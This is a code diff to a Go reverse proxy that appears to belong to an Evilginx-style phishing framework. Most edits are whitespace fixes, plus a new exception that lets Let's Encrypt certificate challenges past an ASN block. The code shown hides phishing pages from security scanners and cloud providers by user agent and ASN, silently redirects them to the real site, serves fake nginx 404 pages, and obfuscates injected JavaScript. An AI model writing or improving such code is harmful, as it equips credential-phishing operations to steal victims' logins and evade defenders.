@@ -205,12 +205,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// Capture User-Agent ONCE to avoid shadowing and redundant calls
 			userAgent := req.Header.Get("User-Agent")
 
-for _, blocked := range blockedUserAgents {
-    if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
-        // Silent stealthy blocking - redirect to real site
-        return p.redirectToLegitSite(req)
-    }
-}
+			for _, blocked := range blockedUserAgents {
+				if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
+					// Silent stealthy blocking - redirect to real site
+					return p.redirectToLegitSite(req)
+				}
+			}
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -230,6 +230,13 @@ for _, blocked := range blockedUserAgents {
 				if clientIP != nil {
 					record, err := p.asn_db.ASN(clientIP)
 					if err == nil {
+						// Whitelist Let's Encrypt validation servers (Amazon ASN 16509)
+						// Allow ACME challenge requests to pass through
+						if strings.Contains(req.URL.Path, "/.well-known/acme-challenge/") {
+							// This is Let's Encrypt validation - allow it
+							goto skip_asn_block
+						}
+
 						// List of ASNs to block (Integers)
 						// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
 						blockedASNs := []uint{17012, 1449, 206753, 59065, 26444, 19527, 36040, 396982, 16550, 16591, 35693, 397316, 8075, 16509, 15169, 29981}
@@ -243,6 +250,7 @@ for _, blocked := range blockedUserAgents {
 					}
 				}
 			}
+		skip_asn_block:
 			// --- END ASN BLOCKING ---
 
 			if p.cfg.GetBlacklistMode() != "off" {
@@ -285,7 +293,7 @@ for _, blocked := range blockedUserAgents {
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
-			
+
 			// Check if URL needs to be reverse-rewritten (from obfuscated back to original)
 			if pl != nil && pl.urlRewriter != nil {
 				// Parse query parameters
@@ -295,7 +303,7 @@ for _, blocked := range blockedUserAgents {
 						queryParams[key] = values[0]
 					}
 				}
-				
+
 				// Check if this is a rewritten URL and get the original path
 				if originalPath, found := pl.urlRewriter.GetOriginalPath(queryParams); found {
 					// Restore the original path for internal routing
@@ -326,7 +334,7 @@ for _, blocked := range blockedUserAgents {
 								minifier := minify.New()
 								minifier.AddFunc("text/javascript", js.Minify)
 								obfuscatedScript, minErr := minifier.String("text/javascript", script)
-								
+
 								if minErr != nil {
 									// Fallback: use original script with dummy function
 									log.Debug("js_inject: minification failed for inject script, using fallback: %v", minErr)
@@ -358,12 +366,12 @@ for _, blocked := range blockedUserAgents {
 								if s.RedirectURL != "" {
 									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
 									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-									
+
 									// Apply minification/obfuscation to redirect script
 									minifier := minify.New()
 									minifier.AddFunc("text/javascript", js.Minify)
 									obfuscatedScript, minErr := minifier.String("text/javascript", dynamic_redirect_js)
-									
+
 									if minErr != nil {
 										// Fallback: use original script with dummy function
 										log.Debug("js_inject: minification failed for redirect script, using fallback: %v", minErr)
@@ -1457,28 +1465,28 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
-	
+
 	if script != "" {
 		// Initialize minifier for JavaScript obfuscation
 		minifier := minify.New()
 		minifier.AddFunc("text/javascript", js.Minify)
-		
+
 		// Attempt to minify and obfuscate the script
 		obfuscatedScript, err := minifier.String("text/javascript", script)
-		
+
 		if err != nil {
 			// Fallback: If minification fails, inject with dummy function only
 			log.Debug("js_inject: minification failed, using fallback: %v", err)
-			d_inject = "<script" + js_nonce + ">" + 
-			           "function doNothing(){var x=0;};" + 
-			           script + 
-			           "</script>\n${1}"
+			d_inject = "<script" + js_nonce + ">" +
+				"function doNothing(){var x=0;};" +
+				script +
+				"</script>\n${1}"
 		} else {
 			// Success: Use minified/obfuscated version with dummy function
-			d_inject = "<script" + js_nonce + ">" + 
-			           "function doNothing(){var x=0;};" + 
-			           obfuscatedScript + 
-			           "</script>\n${1}"
+			d_inject = "<script" + js_nonce + ">" +
+				"function doNothing(){var x=0;};" +
+				obfuscatedScript +
+				"</script>\n${1}"
 		}
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
@@ -2156,7 +2164,7 @@ func (p *HttpProxy) getOrCreateTransport(userAgent string) goproxy.RoundTripper 
 	p.transportMutex.RLock()
 	if transport, exists := p.transportCache[browserType]; exists {
 		p.transportMutex.RUnlock()
-		return &transportWrapper{transport: transport}  // Wrap all returns
+		return &transportWrapper{transport: transport} // Wrap all returns
 
 	}
 	p.transportMutex.RUnlock()
@@ -2229,7 +2237,7 @@ func newTransportWithUA(ua string) *http.Transport {
 			}
 
 			// TCP/IP Fingerprinting Placeholder
-			
+
 			// TODO: Implement OS-specific TCP socket options here (Window Size, TTL, etc.)
 
 			tcpConn, err := dialer.Dial(network, addr)
@@ -2261,6 +2269,7 @@ func newTransportWithUA(ua string) *http.Transport {
 		},
 	}
 }
+
 // return404Response - Returns a convincing "page not found" error
 func (p *HttpProxy) return404Response(req *http.Request) (*http.Request, *http.Response) {
 	body := `<!DOCTYPE html>
@@ -2273,7 +2282,7 @@ func (p *HttpProxy) return404Response(req *http.Request) (*http.Request, *http.R
 <address>nginx/1.18.0 (Ubuntu)</address>
 </body>
 </html>`
-	
+
 	resp := goproxy.NewResponse(req, "text/html", 404, body)
 	resp.Header.Set("Server", "nginx/1.18.0 (Ubuntu)")
 	return req, resp
@@ -2293,19 +2302,19 @@ func (p *HttpProxy) redirectToLegitSite(req *http.Request) (*http.Request, *http
 		// Properly construct the real domain: orig_sub + domain
 		origSub := pl.proxyHosts[0].orig_subdomain
 		baseDomain := pl.proxyHosts[0].domain
-		
+
 		var realDomain string
 		if origSub != "" {
 			realDomain = origSub + "." + baseDomain
 		} else {
 			realDomain = baseDomain
 		}
-		
+
 		redirectURL := "https://" + realDomain + req.URL.Path
 		if req.URL.RawQuery != "" {
 			redirectURL += "?" + req.URL.RawQuery
 		}
-		
+
 		resp := goproxy.NewResponse(req, "text/html", 302, "")
 		resp.Header.Set("Location", redirectURL)
 		resp.Header.Set("Server", "nginx/1.18.0 (Ubuntu)")
